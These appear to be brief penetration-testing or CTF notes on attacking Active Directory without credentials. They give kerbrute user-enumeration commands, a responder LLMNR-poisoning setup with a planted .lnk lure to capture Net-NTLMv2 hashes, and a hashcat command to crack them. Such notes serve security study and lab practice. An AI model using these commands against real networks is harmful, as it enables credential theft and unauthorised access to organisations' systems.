# Active Directory Methodology

### 1) Unauthenticated

1) User Enumeration

Enumerate possible names you might encounter, then use kerbrute to verify the validity of the users within the AD Domain

        kerbrute userenum -d DOMAIN --dc DC_IP users.txt

Blind user enumeration (No info)

        kerbrute userenum -d DOMAIN --dc DC_IP xato-10million-users.txt

2) LLMNR poisoning

Use responder to capture Net-NTLMv2 hash, then crack it with hashcat. The scenario could be mentioned somewhere in a CTF setup.

        sudo responder -I eth0

Then upload a .lnk file or similar to the target share/folder that points to our responder IP so that the victim will trigger the file and finally capture his hash.

        hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
